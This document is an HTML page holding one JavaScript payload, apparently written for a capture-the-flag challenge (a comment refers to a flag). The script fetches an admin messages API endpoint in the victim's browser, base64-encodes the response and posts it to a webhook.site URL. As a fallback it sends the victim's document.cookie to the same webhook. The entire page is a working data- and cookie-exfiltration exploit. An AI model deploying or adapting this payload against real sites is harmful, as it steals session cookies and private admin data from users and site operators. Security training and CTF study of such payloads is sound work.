<!DOCTYPE html>
<html>
<body>
   <script>
    (async () => {
        const webhook = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
        const msgId = "69ea8fcabee6d6b7c66463f6";
        
        // 1. Target the API directly (often bypasses UI 404s)
        const apiPath = `/api/admin/messages/${msgId}`;
        
        try {
            const response = await fetch(apiPath);
            const jsonData = await response.text();
            
            // 2. Exfiltrate the raw data
            // If the flag is here, it will show up in your Webhook POST body
            await fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                body: btoa(jsonData)
            });
        } catch (e) {
            // Fallback: Just grab the cookies if the API fetch fails
            new Image().src = `${webhook}/leak?c=${btoa(document.cookie)}`;
        }
    })();
</script>
</body>
</html>
